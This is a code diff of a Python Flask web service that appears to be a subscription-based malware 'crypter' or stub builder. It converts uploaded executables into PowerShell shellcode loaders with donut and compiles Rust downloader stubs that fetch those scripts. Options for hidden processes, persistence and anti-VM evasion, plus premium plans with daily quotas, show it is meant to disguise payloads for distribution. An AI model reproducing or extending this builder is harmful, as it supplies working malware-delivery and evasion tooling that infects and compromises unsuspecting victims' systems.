@@ -51,9 +51,9 @@ def get_user_stub_info(user_id):
     """Get user's stub information and statistics"""
     user_ps_path = os.path.join(STUBS_PATH, user_id, 'ps')
     user_exe_path = os.path.join(STUBS_PATH, user_id, 'exe')
-    
+
     files = []
-    
+
     if os.path.exists(user_ps_path):
         try:
             for filename in os.listdir(user_ps_path):
@@ -71,7 +71,7 @@ def get_user_stub_info(user_id):
                         })
         except Exception as e:
             print(f"Error reading PowerShell files: {e}")
-    
+
     if os.path.exists(user_exe_path):
         try:
             for filename in os.listdir(user_exe_path):
@@ -89,13 +89,13 @@ def get_user_stub_info(user_id):
                         })
         except Exception as e:
             print(f"Error reading executable files: {e}")
-    
+
     # Calculate stats based on exe files only
     exe_files = [f for f in files if f['type'] == 'exe']
     now = datetime.datetime.now()
     week_ago = now - datetime.timedelta(days=7)
     recent_files = [f for f in exe_files if datetime.datetime.strptime(f['created'], '%m/%d/%Y') > week_ago]
-    
+
     return {
         'files': files,
         'stats': {
@@ -142,19 +142,19 @@ def register():
         username = data.get('username')
         email = data.get('email')
         password = data.get('password')
-        
+
         if not all([username, email, password]):
             return jsonify({'success': False, 'message': 'All fields are required'}), 400
-        
+
         users = read_users()
-        
+
         # Check if user already exists
         if any(user['username'] == username or user['email'] == email for user in users):
             return jsonify({'success': False, 'message': 'Username or email already exists'}), 400
-        
+
         # Hash password
         hashed_password = generate_password_hash(password)
-        
+
         new_user = {
             'id': str(int(datetime.datetime.now().timestamp() * 1000)),
             'username': username,
@@ -168,14 +168,14 @@ def register():
             'dailyUsage': 0,
             'lastResetDate': None
         }
-        
+
         users.append(new_user)
-        
+
         if write_users(users):
             return jsonify({'success': True, 'message': 'Registration successful'})
         else:
             return jsonify({'success': False, 'message': 'Error saving user'}), 500
-            
+
     except Exception as e:
         print(f"Registration error: {e}")
         return jsonify({'success': False, 'message': 'Internal server error'}), 500
@@ -186,29 +186,29 @@ def login():
         data = request.get_json()
         username = data.get('username')
         password = data.get('password')
-        
+
         if not all([username, password]):
             return jsonify({'success': False, 'message': 'Username and password are required'}), 400
-        
+
         users = read_users()
         user = next((u for u in users if u['username'] == username or u['email'] == username), None)
-        
+
         if not user:
             return jsonify({'success': False, 'message': 'Invalid credentials'}), 400
-        
+
         if not check_password_hash(user['password'], password):
             return jsonify({'success': False, 'message': 'Invalid credentials'}), 400
-        
+
         # Set session
         session['userId'] = user['id']
         session['username'] = user['username']
-        
+
         return jsonify({
-            'success': True, 
+            'success': True,
             'message': 'Login successful',
             'user': {'username': user['username'], 'email': user['email']}
         })
-        
+
     except Exception as e:
         print(f"Login error: {e}")
         return jsonify({'success': False, 'message': 'Internal server error'}), 500
@@ -225,17 +225,17 @@ def logout():
 def get_user():
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
-    
+
     users = read_users()
     user = next((u for u in users if u['id'] == session['userId']), None)
-    
+
     if user:
         user = reset_daily_usage_if_needed(user)
         user = check_premium_status(user)
-        
+
         # Update user in database if changes were made
         write_users(users)
-        
+
         return jsonify({
             'success': True,
             'user': {
@@ -258,50 +258,50 @@ def get_user():
 def create_stub():
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
-    
+
     try:
         user_id = session['userId']
         users = read_users()
         current_user = next((u for u in users if u['id'] == user_id), None)
-        
+
         if not current_user:
             return jsonify({'success': False, 'message': 'User not found'}), 404
-        
+
         can_create, message = can_create_stub(current_user)
         if not can_create:
             return jsonify({'success': False, 'message': message}), 403
-        
+
         user_stubs_path = os.path.join(STUBS_PATH, user_id)
         user_ps_path = os.path.join(user_stubs_path, 'ps')
         user_exe_path = os.path.join(user_stubs_path, 'exe')
-        
+
         os.makedirs(user_ps_path, exist_ok=True)
         os.makedirs(user_exe_path, exist_ok=True)
-        
+
         uploaded_file = None
         ps1_file_created = None
         cpp_exe_created = None
-        
+
         user_plain_password = f"{user_id}_night_crypt_key"
-        
+
         if 'file' in request.files:
             file = request.files['file']
             if file.filename != '' and file.filename.lower().endswith('.exe'):
                 filename = secure_filename(file.filename)
                 temp_file_path = os.path.join(user_stubs_path, filename)
                 file.save(temp_file_path)
-                
+
                 try:
                     shellcode = donut.create(
                         file=temp_file_path,
                         arch=2,  # x64 architecture
                         format=8  # PowerShell format
                     )
-                    
+
                     template_path = os.path.join('templates', 'shellcode_template.ps1')
                     with open(template_path, 'r', encoding='utf-8') as f:
                         ps_template = f.read()
-                    
+
                     if isinstance(shellcode, bytes):
                         shellcode_bytes = ','.join([f'0x{b:02x}' for b in shellcode])
                         shellcode_formatted = f"@({shellcode_bytes})"
@@ -309,77 +309,70 @@ def create_stub():
                         shellcode_hex = shellcode if isinstance(shellcode, str) else ''.join([f'{b:02x}' for b in shellcode])
                         hex_bytes = [shellcode_hex[i:i+2] for i in range(0, len(shellcode_hex), 2)]
                         shellcode_formatted = f"@({','.join([f'0x{b}' for b in hex_bytes])})"
-                    
+
                     ps_script = ps_template.replace('{{SHELLCODE_PLACEHOLDER}}', shellcode_formatted)
-                    
+
                     ps1_number = 1
                     while os.path.exists(os.path.join(user_ps_path, f"{ps1_number}.ps1")):
                         ps1_number += 1
-                    
+
                     ps1_filename = f"{ps1_number}.ps1"
                     ps1_path = os.path.join(user_ps_path, ps1_filename)
                     with open(ps1_path, 'w', encoding='utf-8') as f:
                         f.write(ps_script)
-                    
+
                     ps1_file_created = ps1_filename
                     uploaded_file = filename
-                    
+
                     try:
-                        cpp_template_path = os.path.join('templates', 'exp_stub_template.cpp')
-                        with open(cpp_template_path, 'r', encoding='utf-8') as f:
-                            cpp_template = f.read()
-                        
-                        auth_key = hashlib.sha256(f"{user_id}_night_crypt_key".encode()).hexdigest()
+                        rust_template_path = os.path.join('templates', 'rust_stub', 'src', 'main.rs.template')
+                        with open(rust_template_path, 'r', encoding='utf-8') as f:
+                            rust_template = f.read()
+
                         ps_script_url = f"http://127.0.0.1:{PORT}/stubs/{user_id}/ps/{ps1_filename}"
-                        
-                        cpp_code = cpp_template.replace('{{POWERSHELL_SCRIPT_URL}}', ps_script_url)
-                        cpp_code = cpp_code.replace('{{USER_PASSWORD_HASH}}', auth_key)
-                        
-                        cpp_filename = f"exp_stub_{ps1_number}.cpp"
-                        cpp_path = os.path.join(user_stubs_path, cpp_filename)
-                        with open(cpp_path, 'w', encoding='utf-8') as f:
-                            f.write(cpp_code)
-                        
+
+                        rust_code = rust_template.replace('{{POWERSHELL_URL}}', ps_script_url)
+
+                        rust_main_path = os.path.join('templates', 'rust_stub', 'src', 'main.rs')
+                        with open(rust_main_path, 'w', encoding='utf-8') as f:
+                            f.write(rust_code)
+
                         exe_filename = f"exp_stub_{ps1_number}.exe"
                         exe_path = os.path.join(user_exe_path, exe_filename)
-                        
+
                         compile_cmd = [
-                            'g++', 
-                            cpp_path, 
-                            '-lwininet', 
-                            '-o', 
-                            exe_path
+                            'cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'
                         ]
-                        
-                        result = subprocess.run(compile_cmd, capture_output=True, text=True)
-                        
+
+                        result = subprocess.run(compile_cmd, cwd=os.path.join('templates', 'rust_stub'), capture_output=True, text=True)
+
                         if result.returncode == 0:
                             cpp_exe_created = exe_filename
-                            print(f"Successfully compiled C++ stub: {exe_filename}")
+                            print(f"Successfully compiled Rust stub: {exe_filename}")
+
+                            # Move the compiled executable to the user's exe folder
+                            compiled_exe_path = os.path.join('templates', 'rust_stub', 'target', 'x86_64-pc-windows-gnu', 'release', 'rust_s.exe')
+                            os.rename(compiled_exe_path, exe_path)
                         else:
-                            print(f"C++ compilation failed: {result.stderr}")
-                        
-                        os.remove(cpp_path)
-                        
-                    except Exception as cpp_error:
-                        print(f"Error creating C++ stub: {cpp_error}")
-                        if os.path.exists(cpp_path):
-                            os.remove(cpp_path)
-                    
+                            print(f"Rust compilation failed: {result.stderr}")
+
+                    except Exception as rust_error:
+                        print(f"Error creating Rust stub: {rust_error}")
+
                     os.remove(temp_file_path)
-                    
+
                 except Exception as e:
                     print(f"Error converting .exe to shellcode: {e}")
                     if os.path.exists(temp_file_path):
                         os.remove(temp_file_path)
                     return jsonify({'success': False, 'message': f'Error converting .exe file to PowerShell shellcode: {str(e)}'}), 500
-        
+
         file_name = request.form.get('fileName', '')
         auto_start = request.form.get('autoStart') == 'true'
         hide_process = request.form.get('hideProcess') == 'true'
         persistence = request.form.get('persistence') == 'true'
         anti_vm = request.form.get('antiVM') == 'true'
-        
+
         stub_config = {
             'fileName': file_name,
             'options': {
@@ -393,19 +386,19 @@ def create_stub():
             'powershellFile': ps1_file_created,
             'cppExecutable': cpp_exe_created
         }
-        
+
         config_path = os.path.join(user_stubs_path, f"{file_name}.config.json")
         with open(config_path, 'w') as f:
             json.dump(stub_config, f, indent=2)
-        
+
         increment_daily_usage(user_id)
-        
+
         success_message = 'Stub created successfully'
         if ps1_file_created:
             success_message += f' - PowerShell file: {ps1_file_created}'
         if cpp_exe_created:
             success_message += f' - C++ executable: {cpp_exe_created}'
-        
+
         return jsonify({
             'success': True,
             'message': success_message,
@@ -413,7 +406,7 @@ def create_stub():
             'config': stub_config,
             'executableFile': cpp_exe_created
         })
-        
+
     except Exception as e:
         print(f"Error creating stub: {e}")
         return jsonify({'success': False, 'message': 'Error creating stub'}), 500
@@ -422,19 +415,19 @@ def create_stub():
 def upgrade_to_premium():
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
-    
+
     data = request.get_json()
     plan = data.get('plan')
-    
+
     if plan not in ['monthly', 'yearly']:
         return jsonify({'success': False, 'message': 'Invalid plan'}), 400
-    
+
     users = read_users()
     user = next((u for u in users if u['id'] == session['userId']), None)
-    
+
     if not user:
         return jsonify({'success': False, 'message': 'User not found'}), 404
-    
+
     # Calculate expiry date
     now = datetime.datetime.now()
     if plan == 'monthly':
@@ -443,7 +436,7 @@ def upgrade_to_premium():
     else:  # yearly
         expiry = now + datetime.timedelta(days=365)
         daily_limit = 10
-    
+
     # Update user
     user['isPremium'] = True
     user['subscriptionType'] = plan
@@ -451,9 +444,9 @@ def upgrade_to_premium():
     user['dailyLimit'] = daily_limit
     user['dailyUsage'] = 0
     user['lastResetDate'] = now.strftime('%Y-%m-%d')
-    
+
     write_users(users)
-    
+
     return jsonify({
         'success': True,
         'message': f'Successfully upgraded to {plan} plan',
@@ -464,17 +457,17 @@ def upgrade_to_premium():
 def get_user_stats():
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
-    
+
     user_id = session['userId']
     stub_info = get_user_stub_info(user_id)
-    
+
     return jsonify(stub_info['stats'])
 
 @app.route('/api/user/activity', methods=['GET'])
 def get_user_activity():
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
-    
+
     # Mock activity data - in real app, you'd query actual activity
     activities = [
         {
@@ -494,14 +487,14 @@ def get_user_activity():
             'statusClass': 'complete'
         }
     ]
-    
+
     return jsonify(activities)
 
 @app.route('/api/user/files', methods=['GET'])
 def get_user_files():
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
-    
+
     stub_info = get_user_stub_info(session['userId'])
     return jsonify(stub_info['files'])
 
@@ -509,12 +502,12 @@ def get_user_files():
 def download_file(file_path):
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
-    
+
     if not file_path.startswith(session['userId'] + '/exe/') or not file_path.endswith('.exe'):
         return jsonify({'success': False, 'message': 'Access denied'}), 403
-    
+
     full_path = os.path.join(STUBS_PATH, file_path)
-    
+
     if os.path.exists(full_path):
         return send_file(full_path, as_attachment=True)
     else:
@@ -524,13 +517,13 @@ def download_file(file_path):
 def view_file(file_path):
     if 'userId' not in session:
         return jsonify({'success': False, 'message': 'Not authenticated'}), 401
-    
+
     # Only allow viewing PowerShell files and ensure user owns the file
     if not file_path.startswith(session['userId'] + '/ps/') or not file_path.endswith('.ps1'):
         return jsonify({'success': False, 'message': 'Access denied'}), 403
-    
+
     full_path = os.path.join(STUBS_PATH, file_path)
-    
+
     if os.path.exists(full_path):
         try:
             with open(full_path, 'r', encoding='utf-8') as f:
@@ -545,17 +538,17 @@ def view_file(file_path):
 def serve_powershell_script(user_id, filename):
     if not filename.endswith('.ps1'):
         return jsonify({'error': 'Invalid file type'}), 400
-    
+
     auth_key = request.args.get('key')
     if not auth_key:
         return jsonify({'error': 'Authentication key required'}), 401
-    
+
     expected_key = hashlib.sha256(f"{user_id}_night_crypt_key".encode()).hexdigest()
     if auth_key != expected_key:
         return jsonify({'error': 'Invalid authentication key'}), 403
-    
+
     file_path = os.path.join(STUBS_PATH, user_id, 'ps', filename)
-    
+
     if os.path.exists(file_path):
         return send_file(file_path, mimetype='text/plain')
     else:
@@ -587,13 +580,13 @@ def can_create_stub(user):
     """Check if user can create a stub (premium + daily limit)"""
     user = reset_daily_usage_if_needed(user)
     user = check_premium_status(user)
-    
+
     if not user.get('isPremium', False):
         return False, "Premium membership required to create stubs"
-    
+
     if user.get('dailyUsage', 0) >= user.get('dailyLimit', 0):
         return False, "Daily limit reached. Try again tomorrow"
-    
+
     return True, "OK"
 
 def increment_daily_usage(user_id):
